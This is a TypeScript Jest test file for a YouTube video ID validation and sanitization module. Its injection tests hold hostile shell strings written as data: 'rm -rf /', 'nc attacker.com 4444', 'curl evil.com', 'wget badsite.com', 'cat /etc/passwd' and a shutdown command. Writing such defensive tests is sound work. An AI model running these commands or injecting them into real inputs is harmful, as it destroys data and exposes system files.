import {
	InvalidVideoIdError,
	isValidYouTubeVideoId,
	validateAndSanitizeVideoId,
} from './validation';

describe('YouTube Video ID Validation', () => {
	describe('isValidYouTubeVideoId', () => {
		test('should return true for valid YouTube video IDs', () => {
			expect(isValidYouTubeVideoId('dQw4w9WgXcQ')).toBe(true);
			expect(isValidYouTubeVideoId('ScMzIvxBSi4')).toBe(true);
			expect(isValidYouTubeVideoId('_Ab1234567-')).toBe(true);
		});

		test('should return false for invalid video IDs', () => {
			expect(isValidYouTubeVideoId('too_short')).toBe(false);
			expect(isValidYouTubeVideoId('this_is_way_too_long')).toBe(false);
			expect(isValidYouTubeVideoId('invalid@char')).toBe(false);
			expect(isValidYouTubeVideoId('spaces here')).toBe(false);
			expect(isValidYouTubeVideoId('')).toBe(false);
		});

		test('should return false for non-string inputs', () => {
			expect(isValidYouTubeVideoId(null as any)).toBe(false);
			expect(isValidYouTubeVideoId(undefined as any)).toBe(false);
			expect(isValidYouTubeVideoId(123 as any)).toBe(false);
		});
	});

	describe('validateAndSanitizeVideoId', () => {
		test('should return sanitized valid video IDs', () => {
			expect(validateAndSanitizeVideoId('dQw4w9WgXcQ')).toBe('dQw4w9WgXcQ');
			expect(validateAndSanitizeVideoId(' dQw4w9WgXcQ ')).toBe('dQw4w9WgXcQ');
		});

		test('should throw InvalidVideoIdError for invalid video IDs', () => {
			expect(() => validateAndSanitizeVideoId('invalid')).toThrow(
				InvalidVideoIdError,
			);
			expect(() => validateAndSanitizeVideoId("'; rm -rf /'")).toThrow(
				InvalidVideoIdError,
			);
			expect(() => validateAndSanitizeVideoId('$(malicious)')).toThrow(
				InvalidVideoIdError,
			);
			expect(() => validateAndSanitizeVideoId('`command`')).toThrow(
				InvalidVideoIdError,
			);
			expect(() => validateAndSanitizeVideoId('|dangerous')).toThrow(
				InvalidVideoIdError,
			);
		});

		test('should throw InvalidVideoIdError for command injection attempts', () => {
			const maliciousInputs = [
				'; rm -rf /',
				'&& curl evil.com',
				'| nc attacker.com 4444',
				'`wget badsite.com`',
				'$(echo pwned)',
				'; cat /etc/passwd',
				'& shutdown -h now',
				'; python -c "import os; os.system(\'rm -rf /\')"',
			];

			for (const input of maliciousInputs) {
				expect(() => validateAndSanitizeVideoId(input)).toThrow(
					InvalidVideoIdError,
				);
			}
		});

		test('should throw InvalidVideoIdError for non-string inputs', () => {
			expect(() => validateAndSanitizeVideoId(null as any)).toThrow(
				InvalidVideoIdError,
			);
			expect(() => validateAndSanitizeVideoId(undefined as any)).toThrow(
				InvalidVideoIdError,
			);
			expect(() => validateAndSanitizeVideoId(123 as any)).toThrow(
				InvalidVideoIdError,
			);
		});
	});
});
